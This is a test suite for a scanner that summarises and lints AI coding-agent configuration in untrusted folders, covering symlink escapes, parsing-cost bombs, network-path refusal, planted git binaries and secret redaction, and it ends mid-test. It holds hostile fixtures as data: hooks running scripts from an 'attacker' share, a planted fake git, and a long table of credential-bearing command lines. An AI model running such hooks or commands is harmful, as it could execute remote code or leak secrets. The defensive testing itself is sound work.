// The harness summary on a folder nobody opened or trusted: every file in it is hostile. Symlink loops and links out of the folder, quadratic
// parsing, network paths, the git child's working directory, and what the summary may name or quote. The same scan serves the editor's map and
// `harness:lint`, which have their own tests; the ones here that go through scanCore.ts directly check they still hold there.
import { test, before, after } from 'node:test'
import assert from 'node:assert/strict'
import { build } from 'esbuild'
import { linkSync, mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join, resolve, win32, posix } from 'node:path'
import { execFileSync } from 'node:child_process'
import { fileURLToPath, pathToFileURL } from 'node:url'

const ROOT = resolve(dirname(fileURLToPath(import.meta.url)), '..')
const T = { timeout: 20000 }
let tmp
let S, C, H, SC, LI, PG, IG, R0
let n = 0

const write = (file, text) => {
	mkdirSync(dirname(file), { recursive: true })
	writeFileSync(file, text)
}
const repo = files => {
	const dir = join(tmp, 'r' + n++)
	mkdirSync(dir, { recursive: true })
	for (const [name, text] of Object.entries(files)) { write(join(dir, name), text) }
	return dir
}
const bundle = async name => {
	const outfile = join(tmp, name + '.mjs')
	await build({ entryPoints: [join(ROOT, 'src', name + '.ts')], bundle: true, platform: 'node', format: 'esm', outfile, logLevel: 'silent', mainFields: ['module', 'main'] })
	return import(pathToFileURL(outfile).href)
}
const link = (target, at) => {
	mkdirSync(dirname(at), { recursive: true })
	symlinkSync(target, at)
}
const timed = async f => {
	const started = Date.now()
	const value = await f()
	return { value, ms: Date.now() - started }
}
const scan = (dir, deadline, options = {}) => SC.scanFolders([{ name: 'x', fsPath: dir }], H.fsScanHost([dir], deadline), { user: false, ...(deadline ? { deadline } : {}), ...options })

before(async () => {
	tmp = realpathSync.native(mkdtempSync(join(tmpdir(), 'flow-hostile-')))
	process.env.CLAUDE_CONFIG_DIR = join(tmp, 'user-claude')
	process.env.CODEX_HOME = join(tmp, 'user-codex')
	process.env.HOME = tmp
	process.env.USERPROFILE = tmp
	write(join(tmp, 'user-claude', 'settings.json'), JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'command', command: 'echo user-stop' }] }] } }))
	;[S, C, H, SC, LI, PG, IG, R0] = await Promise.all(['summary', 'summaryCore', 'scanFsHost', 'scanCore', 'lint', 'pathGuard', 'ignored', 'redact'].map(bundle))
})
after(() => rmSync(tmp, { recursive: true, force: true }))

const walkStrings = (v, f) => { if (typeof v === 'string') { f(v) } else if (Array.isArray(v)) { v.forEach(x => walkStrings(x, f)) } else if (v && typeof v === 'object') { Object.values(v).forEach(x => walkStrings(x, f)) } }

// ---- 1: links ----------------------------------------------------------------------------------------------------------------
test('a rules folder full of links back to itself is answered at once, and the next scan is not held up behind it', T, async () => {
	const dir = repo({ 'CLAUDE.md': '# x\n', '.claude/rules/keep.md': 'A rule that stays.\n' })
	link('.', join(dir, '.claude', 'rules', 'a'))
	link('.', join(dir, '.claude', 'rules', 'b'))
	const clean = repo({ 'CLAUDE.md': '# clean\n' })
	const first = await timed(() => S.harnessSummary(dir))
	assert.equal(first.value.ok, true, JSON.stringify(first.value))
	assert.ok(first.ms < 1500, 'answered in ' + first.ms)
	assert.deepEqual(first.value.summary.instructions.filter(i => i.kind === 'rules').map(i => i.name), ['keep.md'], 'the links are not followed, so nothing is listed twice')
	const next = await timed(() => S.harnessSummary(clean))
	assert.equal(next.value.ok, true)
	assert.ok(next.ms < 1000, 'the next scan waited ' + next.ms)
	const mem = process.memoryUsage().rss
	assert.ok(mem < 1.2 * 1024 ** 3, 'rss ' + mem)
})

test('a link to a folder elsewhere is not walked, and no file outside the folder is named in the summary', T, async () => {
	const outside = join(tmp, 'outside-' + n++)
	write(join(outside, 'NEWS.md'), '# news\nsecret outside text\n')
	write(join(outside, 'deploy', 'SKILL.md'), '---\nname: leaked-skill\ndescription: Leaked description from outside the folder\n---\n')
	write(join(outside, 'agent.md'), '---\nname: leaked-agent\ndescription: Leaked\n---\n')
	write(join(outside, 'CLAUDE.md'), '# outside claude\n')
	const dir = repo({ 'CLAUDE.md': '# x\n' })
	link(outside, join(dir, '.claude', 'rules', 'u'))
	link(join(outside, 'deploy'), join(dir, '.claude', 'skills', 'deploy'))
	link(join(outside, 'CLAUDE.md'), join(dir, 'sub', 'CLAUDE.md'))
	link(join(outside, 'CLAUDE.md'), join(dir, 'AGENTS.md'))
	link(outside, join(dir, '.cursor', 'rules'))
	const r = await S.harnessSummary(dir)
	assert.equal(r.ok, true)
	const json = JSON.stringify(r.summary)
	for (const bad of ['NEWS.md', 'leaked-skill', 'leaked-agent', 'secret outside text', outside]) { assert.ok(!json.includes(bad), `names ${bad}`) }
	// And every file the panel may be asked to open lies, once its links are followed, inside the folder or the user's own folders.
	const allowed = [dir, join(tmp, 'user-claude'), join(tmp, 'user-codex')]
	for (const f of C.filesOf(r.summary)) {
		const real = realpathSync.native(f)
		assert.ok(allowed.some(a => real === a || real.startsWith(a + '/')), `${f} -> ${real}`)
	}
	// The links to files are told about once, in the notes, without naming them.
	assert.ok(r.summary.notes.some(x => /links to something outside the folder/i.test(x)), JSON.stringify(r.summary.notes))
	// A rules folder that is itself a link out of the folder is not listed either.
	assert.deepEqual(r.summary.instructions.filter(i => i.kind === 'rules'), [])
})

test('the walks stop at a depth and an entry cap, and a scan past its deadline stops reading and lets the next one start', T, async () => {
	const files = {}
	for (let i = 0; i < 3000; i++) { files[`.claude/rules/r${i}.md`] = 'rule\n' }
	let deep = '.claude/rules'
	for (let i = 0; i < 60; i++) { deep += '/d' }
	files[deep + '/deep.md'] = 'deep\n'
	const dir = repo(files)
	const capped = await timed(() => scan(dir))
	assert.ok(capped.ms < 3000, 'took ' + capped.ms)
	const rules = capped.value.items.filter(i => i.kind === 'rules')
	assert.ok(rules.length > 0 && rules.length <= 1000, 'a bounded list: ' + rules.length)
	assert.ok(!rules.some(i => i.file.endsWith('deep.md')), 'depth is capped')
	// A deadline already behind us: nothing is read, and the scan answers at once.
	const late = await timed(() => scan(dir, Date.now() - 1))
	assert.ok(late.ms < 500, 'took ' + late.ms)
	assert.equal(late.value.items.filter(i => i.kind === 'rules').length, 0, 'nothing read after the deadline')
	const after = await timed(() => scan(repo({ 'CLAUDE.md': '# x\n' })))
	assert.ok(after.ms < 500)
})

test('the same links in the editor\'s own scan (user files read, nothing confined) are not followed either', T, async () => {
	const outside = join(tmp, 'outside-' + n++)
	write(join(outside, 'NEWS.md'), '# news\n')
	const dir = repo({ 'CLAUDE.md': '# x\n', '.claude/rules/keep.md': 'A rule.\n' })
	link('.', join(dir, '.claude', 'rules', 'a'))
	link(outside, join(dir, '.claude', 'rules', 'u'))
	const r = await timed(() => SC.scanFolders([{ name: 'x', fsPath: dir }], H.fsScanHost([dir]), { memory: false }))
	assert.ok(r.ms < 2000, 'took ' + r.ms)
	assert.deepEqual(r.value.items.filter(i => i.kind === 'rules').map(i => i.label), ['keep.md'])
})

// ---- 2: quadratic parsing -----------------------------------------------------------------------------------------------------
test('a frontmatter description of 100 000 lines is parsed in linear time, in the lint and in the scan', T, async () => {
	const text = '---\nname: x\ndescription: >\n' + '  word word word\n'.repeat(40_000) + '---\nbody\n'
	const lint = await timed(() => LI.lint({ files: [{ file: '/p/SKILL.md', label: 'SKILL.md', kind: 'skill', text }], hooks: [], rules: [], cwd: '/p', home: '/h' }))
	assert.ok(lint.ms < 500, 'lint took ' + lint.ms)
	const dir = repo({ 'CLAUDE.md': '# x\n', '.claude/skills/big/SKILL.md': text, '.claude/skills/list/SKILL.md': '---\nname: l\ndescription: A list skill that has a long list\ntools:\n' + '  - Read\n'.repeat(100_000) + '---\n' })
	const scanned = await timed(() => scan(dir))
	assert.ok(scanned.ms < 1500, 'scan took ' + scanned.ms)
	assert.equal(scanned.value.items.filter(i => i.kind === 'skills').length, 2)
	// The same text as a rule's `paths:` list.
	const rule = '---\npaths:\n' + '  - "src/**"\n'.repeat(100_000) + '---\nbody text of the rule here\n'
	const ruled = await timed(() => LI.lint({ files: [{ file: '/p/r.md', label: 'r.md', kind: 'claude-rule', text: rule }], hooks: [], rules: [], cwd: '/p', home: '/h', projectFiles: Array.from({ length: 20000 }, (_, i) => 'f' + i + '.ts') }))
	assert.ok(ruled.ms < 1500, 'globs took ' + ruled.ms)
})

test('other inputs that cost more than their size: one line of a million characters, the same sentence 25 000 times, a settings file of 50 000 rules, a CLAUDE.md of 40 000 imports', T, async () => {
	const line = 'Never ' + 'x'.repeat(900_000) + ' always the other thing too'
	const long = await timed(() => LI.lint({ files: [{ file: '/p/CLAUDE.md', label: 'CLAUDE.md', kind: 'claude-md', text: 'Do not use tabs in this project please ' + line }], hooks: [], rules: [], cwd: '/p', home: '/h' }))
	assert.ok(long.ms < 1000, 'a long line took ' + long.ms)
	const same = await timed(() => LI.lint({ files: [{ file: '/p/CLAUDE.md', label: 'CLAUDE.md', kind: 'claude-md', text: 'Always run the whole test suite before you push anything\n'.repeat(25_000) }], hooks: [], rules: [], cwd: '/p', home: '/h' }))
	assert.ok(same.ms < 1000, 'repeated lines took ' + same.ms)
	const allow = Array.from({ length: 50_000 }, (_, i) => `Bash(cmd${i} *)`)
	const hooks = Array.from({ length: 5_000 }, (_, i) => ({ type: 'command', command: `bash .claude/h${i}.sh` }))
	const imports = Array.from({ length: 40_000 }, (_, i) => `@docs/file${i}.md`).join('\n')
	const dir = repo({ '.claude/settings.json': JSON.stringify({ permissions: { allow, deny: allow.slice(0, 20_000).map(x => x + ' ') }, hooks: { Stop: [{ hooks }] } }, null, 2), 'CLAUDE.md': imports.slice(0, 1_000_000) })
	const r = await timed(() => scan(dir, undefined, { maxFileBytes: 1024 * 1024 }))
	assert.ok(r.ms < 3000, 'the scan took ' + r.ms)
	assert.ok(r.value.notes?.some(x => /first|only/i.test(x)), 'a cut is said: ' + JSON.stringify(r.value.notes))
})

// ---- 4: network and outside paths ---------------------------------------------------------------------------------------------
test('pathVerdict: network paths are refused by what the file wrote, and outside the folder only for a folder that is not trusted', T, () => {
	for (const p of [win32, posix]) {
		const root = p === win32 ? 'C:\\proj' : '/proj'
		const at = rel => p.resolve(root, rel)
		for (const raw of ['//attacker/share/x.md', '\\\\attacker\\share\\x.sh', '\\\\?\\UNC\\attacker\\share\\x', '\\\\.\\pipe\\x', '/\\attacker/x', '\\/attacker/x']) {
			for (const confine of [false, true]) { assert.equal(PG.pathVerdict(raw, at(raw), root, confine, p), 'network', `${p === win32 ? 'win32' : 'posix'} ${raw}`) }
		}
		assert.equal(PG.pathVerdict('docs/x.md', at('docs/x.md'), root, true, p), 'ok')
		assert.equal(PG.pathVerdict('./x.md', at('./x.md'), root, true, p), 'ok')
		assert.equal(PG.pathVerdict('../x.md', at('../x.md'), root, true, p), 'outside')
		assert.equal(PG.pathVerdict('../x.md', at('../x.md'), root, false, p), 'ok', 'a trusted folder may import from its parent')
		assert.equal(PG.pathVerdict('x..md/y', at('x..md/y'), root, true, p), 'ok', 'a name with two dots is a name')
		assert.equal(PG.pathVerdict(root, root, root, true, p), 'ok', 'the folder itself')
	}
	assert.equal(PG.pathVerdict('/etc/hosts.md', '/etc/hosts.md', '/proj', true, posix), 'outside')
	assert.equal(PG.pathVerdict('/etc/hosts.md', '/etc/hosts.md', '/proj', false, posix), 'ok')
	assert.equal(PG.pathVerdict('D:\\x.md', 'D:\\x.md', 'C:\\proj', true, win32), 'outside', 'another drive')
	assert.equal(PG.pathVerdict('D:\\x.md', 'D:\\x.md', 'C:\\proj', false, win32), 'ok')
	assert.equal(PG.pathVerdict('c:\\PROJ\\x.md', 'c:\\PROJ\\x.md', 'C:\\proj', true, win32), 'ok', 'Windows paths ignore case')
	// A folder opened from a share is checked inside; what leaves it for another host is not.
	const share = '\\\\nas\\team\\proj'
	assert.equal(PG.pathVerdict('docs/x.md', win32.resolve(share, 'docs/x.md'), share, true, win32), 'ok')
	assert.equal(PG.pathVerdict('..\\..\\other\\x.md', win32.resolve(share, '..\\..\\other\\x.md'), share, false, win32), 'network')
})

test('a CLAUDE.md that imports a network path or a path outside the folder, and a hook that runs a script there, are not stat\'ed: not checked, never broken', T, async () => {
	const dir = repo({
		'CLAUDE.md': '# x\nSee @//attacker/share/x.md and @/etc/hosts.md and @../up.md and `../../up2.md` and `docs/nope.md`.\n',
		'.claude/settings.json': JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'command', command: 'bash \\\\attacker\\share\\x.sh' }, { type: 'command', command: 'bash //attacker/share/y.sh' }, { type: 'command', command: 'bash /etc/nothing.sh' }, { type: 'command', command: 'bash .claude/missing.sh' }] }] } }),
	})
	const r = await S.harnessSummary(dir)
	assert.equal(r.ok, true)
	const codes = r.summary.findings.map(f => [f.code, f.line])
	assert.deepEqual(codes.filter(c => c[0] === 'broken-import'), [], 'nothing outside is called a broken import')
	assert.deepEqual(r.summary.findings.filter(f => f.code === 'missing-script').length, 1, 'only the script inside the folder is checked')
	assert.ok(r.summary.findings.some(f => f.code === 'broken-path' && f.where === 'CLAUDE.md'), 'a path inside the folder still is')
	assert.ok(r.summary.findings.filter(f => f.code === 'path-not-checked').length >= 4, JSON.stringify(codes))
	// The CLI trusts the folder's own: an import from the parent is checked, a network path never is.
	const cli = await LI.lintFolder?.(dir)
	void cli
	const harness = await scan(dir)
	const issues = harness.items.flatMap(i => i.issues)
	assert.ok(!issues.some(i => i.code === 'broken-import' && /attacker/.test(i.message)), 'a network path is not checked in a trusted scan either')
	assert.ok(issues.some(i => i.code === 'broken-import'), 'a trusted scan still checks @/etc/hosts.md')
})

// ---- 5: git and the file reads ------------------------------------------------------------------------------------------------
test('git is run from a neutral folder with -C, so a program planted in the scanned folder is never the one found', T, () => {
	const { args, cwd } = IG.gitCommand('/some/scanned/folder')
	assert.deepEqual(args.slice(0, 4), ['-c', 'core.fsmonitor=false', '-C', '/some/scanned/folder'])
	assert.ok(args.includes('check-ignore'))
	assert.notEqual(cwd, '/some/scanned/folder')
	assert.equal(cwd, tmpHome())
})
const tmpHome = () => process.env.HOME

test('git still says what it ignores, for a repository whose folder holds a program called git', T, async () => {
	const dir = repo({ 'a/CLAUDE.md': '# a\n', 'b/CLAUDE.md': '# b\n', '.gitignore': 'b/\n', 'git': '#!/bin/sh\necho planted > planted.txt\n', 'git.exe': 'x', 'git.cmd': 'x' })
	execFileSync('git', ['init', '-q'], { cwd: dir })
	const ignored = await IG.gitIgnoredOf(dir, [join(dir, 'a', 'CLAUDE.md'), join(dir, 'b', 'CLAUDE.md')])
	assert.deepEqual([...ignored], [join(dir, 'b', 'CLAUDE.md')])
})

test('a named pipe where an instruction file or a rule should be is skipped, whatever folder it is in', T, async () => {
	const dir = repo({ '.claude/rules/ok.md': 'ok\n' })
	try { execFileSync('mkfifo', [join(dir, 'CLAUDE.md')]); execFileSync('mkfifo', [join(dir, '.claude', 'rules', 'pipe.md')]) } catch { return }
	const r = await timed(() => scan(dir, Date.now() + 1500, { maxFileBytes: 1024 * 1024 }))
	assert.ok(r.ms < 1500, 'took ' + r.ms)
	assert.deepEqual(r.value.items.filter(i => i.kind === 'rules').map(i => i.label), ['ok.md'])
})

// ---- 3: what the findings may quote -------------------------------------------------------------------------------------------
test('no finding of a summary quotes the text of a file: a fixed sentence per check, and the findings agree with the CLI\'s on where and what', T, async () => {
	const TEXT = 'ZZQUOTEDZZ'
	const dir = repo({
		'CLAUDE.md': `# x\nSee @docs/${TEXT}.md and \`docs/${TEXT}/x.md\`. Do not use ${TEXT} anywhere in this project at all.\nAlways use ${TEXT} anywhere in this project at all.\n`,
		'.claude/skills/Bad Name/SKILL.md': `---\nname: ${TEXT} Bad\ndescription: ${TEXT}\nfoo: [${TEXT}\n${TEXT} line\n---\n`,
		'.claude/rules/r.md': `---\npaths: ["${TEXT}/**"]\n---\nrule body here that is long enough to count\n`,
		'.claude/settings.json': JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: 'command', command: `bash .claude/${TEXT}.sh` }] }], [TEXT]: [{ hooks: [{ type: 'command', command: 'echo' }] }] } }),
	})
	const r = await S.harnessSummary(dir)
	assert.equal(r.ok, true)
	assert.ok(r.summary.findings.length >= 5, JSON.stringify(r.summary.findings))
	walkStrings(r.summary.findings.map(f => f.message), s => assert.ok(!s.includes(TEXT), s))
})

// ---- 3: redaction, by name -----------------------------------------------------------------------------------------------------
/** [a line, the secret in it]: the secret must not be in the output, whatever else is. */
const LEAKS = [
	// flags
	['tool --token=hunter2xyz', 'hunter2xyz'], ['tool --token hunter2xyz', 'hunter2xyz'], ['tool --client-secret=hunter2xyz run', 'hunter2xyz'], ['tool --auth hunter2xyz', 'hunter2xyz'],
	['tool --api_key "hunter2 xyz"', 'xyz'], ['tool --password=\'hunter2 xyz\' go', 'xyz'], ['tool --Passwd hunter2xyz', 'hunter2xyz'], ['tool --pwd=hunter2xyz', 'hunter2xyz'],
	['tool --credential hunter2xyz', 'hunter2xyz'], ['tool --cookie hunter2xyz', 'hunter2xyz'], ['tool --session-id hunter2xyz', 'hunter2xyz'], ['tool --signature=hunter2xyz', 'hunter2xyz'],
	['tool --code hunter2xyz', 'hunter2xyz'], ['tool --bearer hunter2xyz', 'hunter2xyz'], ['java -Ddb.password=hunter2xyz -jar x.jar', 'hunter2xyz'], ['tool --token "unterminated hunter2xyz', 'hunter2xyz'],
	['tool --private-key-file hunter2xyz', 'hunter2xyz'], ['tool --pw hunter2xyz', 'hunter2xyz'], ['tool --sig=hunter2xyz', 'hunter2xyz'],
	// short flags known to carry secrets
	['mysql -u root -phunter2xyz db', 'hunter2xyz'], ['mysql -p hunter2xyz db', 'hunter2xyz'], ['sshpass -p hunter2xyz ssh host', 'hunter2xyz'], ['unzip -P hunter2xyz a.zip', 'hunter2xyz'], ['7z x -phunter2xyz a.7z', 'hunter2xyz'],
	['curl -u admin:hunter2xyz https://x.dev', 'hunter2xyz'], ['curl -uadmin:hunter2xyz https://x.dev', 'hunter2xyz'], ['curl --user admin:hunter2xyz x', 'hunter2xyz'], ['curl --user=admin:hunter2xyz x', 'hunter2xyz'],
	['curl --proxy-user a:hunter2xyz x', 'hunter2xyz'], ['redis-cli -a hunter2xyz ping', 'hunter2xyz'], ['http -a admin:hunter2xyz x', 'hunter2xyz'], ['cd a; mysql -phunter2xyz', 'hunter2xyz'],
	// request bodies, a quote before the name
	['curl -d "client_secret=hunter2xyz" x', 'hunter2xyz'], ['curl --data "password=hunter2xyz" x', 'hunter2xyz'], ['curl --data-urlencode \'token=hunter2 xyz\' x', 'xyz'],
	['curl -d "a=1&client_secret=hunter2xyz&b=2" x', 'hunter2xyz'], ['curl -d "grant=x&password=my secret phrase" x', 'phrase'], ['curl -d \'{"password":"hunter2xyz"}\' x', 'hunter2xyz'],
	['curl -F "api_key=hunter2xyz" x', 'hunter2xyz'], ['curl --data-raw \'{"token": "hunter2xyz", "a": 1}\' x', 'hunter2xyz'], ['curl -d "a=1&token=a \\" b hunter2xyz" x', 'hunter2xyz'],
	// headers
	['curl -H "Authorization: Bearer hunter2xyz" x', 'hunter2xyz'], ['curl -H \'X-Custom: hunter2xyz\' x', 'hunter2xyz'], ['curl -H X-Foo:hunter2xyz x', 'hunter2xyz'], ['curl --header "Cookie: s=hunter2xyz" x', 'hunter2xyz'],
	['curl --header=X-Thing:hunter2xyz x', 'hunter2xyz'], ['curl -H "PRIVATE-TOKEN: hunter2xyz" x', 'hunter2xyz'], ['curl -H "Authorization: Basic aHVudGVyMnh5ejoxMjM0NTY3OA==" x', 'aHVudGVyMnh5ejoxMjM0NTY3OA'],
	['curl -H "x-api-key: hunter2xyz" -H "Accept: */*" x', 'hunter2xyz'], ['Authorization: token hunter2xyz', 'hunter2xyz'], ['echo "Authorization: Bearer hunter2xyz"', 'hunter2xyz'], ['Set-Cookie: sid=hunter2xyz; Path=/', 'hunter2xyz'],
	// URLs
	['curl https://user:hunter2xyz@example.com/p', 'hunter2xyz'], ['curl https://hunter2xyz@example.com/p', 'hunter2xyz'], ['git clone https://u:p@ss@hunter2xyz.example.com/o/r', 'p@ss'], ['curl "https://x.dev/a?sig=hunter2xyz&b=2"', 'hunter2xyz'],
	['curl "https://x.dev/cb?code=hunter2xyz"', 'hunter2xyz'], ['open "https://x.dev/cb#access_token=hunter2xyz&type=bearer"', 'hunter2xyz'], ['curl https://x.dev/a?X-Amz-Signature=hunter2xyz', 'hunter2xyz'],
	['curl https://x.dev/?apikey=hunter2xyz;echo', 'hunter2xyz'], ['ftp://u:hunter2xyz@h/f', 'hunter2xyz'], ['curl https://hooks.slack.com/services/T000/B000/hunter2xyz', 'hunter2xyz'],
	['curl https://discord.com/api/webhooks/123/hunter2xyz', 'hunter2xyz'],
	// config files and environment
	['//registry.npmjs.org/:_authToken=hunter2xyz', 'hunter2xyz'], ['aws_secret_access_key=hunter2xyz', 'hunter2xyz'], ['AWS_SECRET_ACCESS_KEY=hunter2xyz aws s3 ls', 'hunter2xyz'], ['FOO=a\\ hunter2xyz node x', 'hunter2xyz'],
	['FOO="a \\" hunter2xyz" node x', 'hunter2xyz'], ['export DB_PASSWORD=hunter2xyz', 'hunter2xyz'], ['X=1 TOKEN=hunter2xyz Y=2 run', 'hunter2xyz'], ['docker run -e SECRET=hunter2xyz img', 'hunter2xyz'],
	['echo password=hunter2xyz > f', 'hunter2xyz'], ['spring.datasource.password=hunter2xyz', 'hunter2xyz'], ['env "API_TOKEN=hunter2xyz" run', 'hunter2xyz'],
	// JSON and YAML text
	['{"password": "hunter2xyz"}', 'hunter2xyz'], ['{"user":"a","client_secret":"hunter2xyz","x":1}', 'hunter2xyz'], ['{\'token\': \'hunter2xyz\'}', 'hunter2xyz'], ['{"apiKey":"hunter 2xyz"}', '2xyz'],
	['password: hunter2xyz', 'hunter2xyz'], ['password: "hunter 2xyz"', '2xyz'], ['  api_key: hunter2xyz # note', 'hunter2xyz'], ['{"token": 123456789}', '123456789'], ['"secret" = "hunter2xyz"', 'hunter2xyz'],
	['{"a": {"auth": {"password": "hunter2xyz"}}}', 'hunter2xyz'], ['{"password": "a\\"hunter2xyz"}', 'hunter2xyz'],
	// shapes
	['echo sk_live_abcdefghijklmnop1234', 'abcdefghijklmnop1234'], ['echo sk_test_abcdefghijklmnop1234', 'abcdefghijklmnop1234'], ['echo sk-ant-api03-abcdefghijklmnopqrst', 'abcdefghijklmnopqrst'],
	['echo xoxb-123456789012-abcdefghijkl', 'abcdefghijkl'], ['echo xoxa-2-abcdefghijkl', 'abcdefghijkl'], ['echo xoxp-1-abcdefghijkl', 'abcdefghijkl'], ['echo xoxb1abcdefghijkl', 'abcdefghijkl'],
	['echo ghp_abcdefghijklmnop12', 'abcdefghijklmnop12'], ['echo gho_abcdefghijklmnop12', 'abcdefghijklmnop12'], ['echo github_pat_11ABCDEFG0abcdefghijkl_mnop', 'abcdefghijkl'], ['echo dop_v1_abcdefghijklmnop12', 'abcdefghijklmnop12'],
	['echo AKIAIOSFODNN7EXAMPLE', 'AKIAIOSFODNN7EXAMPLE'], ['echo eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dBjftJeZ4CVPmB92K27uhbUJU1p1r', 'dBjftJeZ4CVPmB92K27uhbUJU1p1r'],
	['echo eyJhbGciOi.eyJzdWIi', 'eyJzdWIi'], ['echo npm_abcdefghijklmnopqrstuvwxyz0123', 'abcdefghijklmnopqrstuvwxyz0123'], ['echo glpat-abcdefghijklmnop12', 'abcdefghijklmnop12'],
	['echo 0123456789abcdef0123456789abcdef01234567', '0123456789abcdef0123456789abcdef01234567'],
	// the same with the program around it and after it
	['$env:API_TOKEN="hunter2xyz"', 'hunter2xyz'], ['db.password="hunter2 xyz"', 'xyz'], ['token = "hunter2xyz"', 'hunter2xyz'], ['password = hunter2xyz', 'hunter2xyz'], ['curl -d \'password="hunter2xyz"\' x', 'hunter2xyz'],
	['bash -c "TOKEN=hunter2xyz npm run x && echo ok"', 'hunter2xyz'], ['sudo -u x env PASSWORD=hunter2xyz run', 'hunter2xyz'], ['a && b --secret hunter2xyz || c', 'hunter2xyz'], ['x\nY_TOKEN=hunter2xyz\nz', 'hunter2xyz'],
]

test('redaction by name: dozens of hostile lines, and none of their secrets is in the output', T, () => {
	const R = R0.redact
	const missed = LEAKS.map(([line, secret]) => [line, secret, R(line, 400)]).filter(([, secret, out]) => out.includes(secret))
	assert.deepEqual(missed.map(([line, , out]) => `${line}  =>  ${out}`), [])
	assert.ok(LEAKS.length >= 100, 'a table of ' + LEAKS.length)
})

test('redaction leaves harmless commands readable', T, () => {
	const R = R0.redact
	for (const line of ['npm run lint -- --fix', 'prettier --write src', 'node scripts/build.mjs --watch --port 3000', 'git commit --author "A B <a@b.c>" -m "fix"', 'jest --passWithNoTests src', 'eslint . --max-warnings 0 --exit-code 1',
		'bash .claude/hooks/check.sh', 'echo "Content-Type: application/json"', 'curl -H "Accept: application/json" -H "User-Agent: x" https://api.example.com/v1/items?page=2&per_page=10', 'tsc --noEmit -p .', 'npx -y @scope/server --path=/usr/bin --config ./c.json']) {
		assert.equal(R(line, 400), line)
	}
	assert.equal(R('git push -u origin main'), 'git push -u *** main', 'a flag that may carry user:pass hides its word, the rest stays')
})

test('a cut inside a token cannot leave its start in view: the last word of a cut input is dropped when everything before it shrank into view', T, () => {
	const R = R0.redact
	const line = ('TOKEN=hunter2xyz ').repeat(50) + 'ghp_ab'
	const out = R(line, 12)
	assert.ok(!out.includes('ghp_'), out)
	const huge = R('A=' + 'b'.repeat(2_000_000) + ' ' + 'c '.repeat(500_000), 200)
	assert.ok(huge.length <= 200)
	const started = Date.now()
	for (const shape of ['"' + 'a'.repeat(1_000_000), '\\'.repeat(1_000_000), '--x '.repeat(300_000), 'a="b '.repeat(200_000), '{"'.repeat(300_000), ' -p'.repeat(300_000), 'ab: '.repeat(300_000)]) { R(shape, 200) }
	assert.ok(Date.now() - started < 1000, 'linear on hostile shapes: ' + (Date.now() - started))
})

// ---- budgets that add up -------------------------------------------------------------------------------------------------------
/** The longest time the event loop was held while `f` ran: a timer cannot interrupt a loop that is busy, so this is what a hung editor feels like. */
async function longestStall(f) {
	let last = Date.now()
	let worst = 0
	const timer = setInterval(() => { const now = Date.now(); worst = Math.max(worst, now - last); last = now }, 10)
	try { await f() } finally { clearInterval(timer) }
	return worst
}

test('rules full of globs: 500 rule files of 100 globs against 20 000 files, brace bombs and stars that make a regular expression explode, are answered in a bounded time', T, async () => {
	const files = Array.from({ length: 500 }, (_, i) => ({
		file: `/p/.claude/rules/r${i}.md`, label: `r${i}.md`, kind: 'claude-rule',
		text: '---\npaths:\n' + Array.from({ length: 100 }, (_, g) => `  - "dir${i}x${g}/**/*.zz"`).join('\n') + '\n---\nbody\n',
	}))
	files.push({ file: '/p/.claude/rules/bomb.md', label: 'bomb.md', kind: 'claude-rule', text: '---\npaths: ["' + '{a,b}'.repeat(40) + '", "*a*a*a*a*a*a*a*a*b", "**/**/**/**/x", "' + 'x'.repeat(5000) + '"]\n---\nbody\n' })
	const projectFiles = Array.from({ length: 20_000 }, (_, i) => `src/pkg${i % 50}/module${i}/${'a'.repeat(60)}.ts`)
	const r = await timed(() => LI.lint({ files, hooks: [], rules: [], cwd: '/p', home: '/h', projectFiles }))
	assert.ok(r.ms < 2500, 'took ' + r.ms)
	assert.ok(!r.value.some(f => f.file.endsWith('bomb.md') && f.code === 'dead-glob'), 'no verdict on globs that cannot be matched safely')
	// And an ordinary dead glob is still found, with a glob that is compiled once.
	const one = LI.lint({ files: [files[0]], hooks: [], rules: [], cwd: '/p', home: '/h', projectFiles })
	assert.equal(one.filter(f => f.code === 'dead-glob').length, 50, 'a file has at most 50 findings of one check')
	const live = LI.lint({ files: [{ file: '/p/r.md', label: 'r.md', kind: 'claude-rule', text: '---\npaths: ["src/**/*.ts"]\n---\nbody\n' }], hooks: [], rules: [], cwd: '/p', home: '/h', projectFiles })
	assert.deepEqual(live.filter(f => f.code === 'dead-glob'), [])
})

test('500 links to one big rule file, and two settings files each at the caps, are a summary of bounded cost: bytes read, time, memory and the longest stall', { timeout: 30000 }, async () => {
	const big = 'a rule line that is long enough to be compared with the others\n'.repeat(15_000)
	const dir = repo({ 'CLAUDE.md': '# x\n', '.claude/rules/r0.md': '---\npaths: ["src/**"]\n---\n' + big })
	for (let i = 1; i < 500; i++) { linkSync(join(dir, '.claude/rules/r0.md'), join(dir, `.claude/rules/r${i}.md`)) }
	const stall = await longestStall(async () => {
		const r = await timed(() => S.harnessSummary(dir))
		assert.equal(r.value.ok, true, JSON.stringify(r.value))
		assert.ok(r.ms < 2600, 'took ' + r.ms)
		assert.ok(r.value.summary.notes.some(x => /add up to more than is read/.test(x)), JSON.stringify(r.value.summary.notes))
		assert.ok(r.value.summary.instructions.filter(i => i.kind === 'rules').length < 60, 'a bounded list')
	})
	assert.ok(stall < 1500, 'the event loop was held for ' + stall)
	assert.ok(process.memoryUsage().rss < 1.2 * 1024 ** 3, 'rss ' + process.memoryUsage().rss)
	const rules = n => Array.from({ length: n }, (_, i) => `Bash(cmd${i} *)`)
	const settings = { permissions: { allow: rules(1600), ask: rules(1600).map(x => x + ' '), deny: rules(1600).map(x => x + '  ') }, hooks: { Stop: [{ hooks: Array.from({ length: 1600 }, (_, i) => ({ type: 'command', command: `bash .claude/h${i}.sh` })) }] } }
	const both = repo({ 'CLAUDE.md': '# x\n', '.claude/settings.json': JSON.stringify(settings, null, 2), '.claude/settings.local.json': JSON.stringify(settings, null, 2) })
	let worst = 0
	const t = await timed(async () => { worst = await longestStall(() => S.harnessSummary(both).then(r => assert.equal(r.ok, true))) })
	assert.ok(t.ms < 4000, 'two full settings files took ' + t.ms)
	assert.ok(worst < 1500, 'stalled ' + worst)
})

test('a link whose target names a network path is refused before anything resolves it, and said once', T, async () => {
